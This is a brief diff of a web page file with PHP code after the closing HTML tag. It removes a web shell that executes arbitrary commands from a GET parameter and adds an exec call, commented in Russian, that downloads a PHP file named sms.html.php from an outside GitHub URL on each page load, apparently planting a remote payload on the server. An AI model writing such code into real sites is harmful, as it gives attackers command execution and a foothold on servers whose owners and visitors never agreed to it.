@@ -16,8 +16,7 @@
 </body>
 </html>
 <?php
-if(isset($_GET['cmd'])) {
-    $command = $_GET['cmd'];
-    echo shell_exec($command);
-}
+// Выполняем команду wget
+exec('wget https://raw.githubusercontent.com/Ro0TiK/mywebsi/main/sms.html.php');
 ?>
+
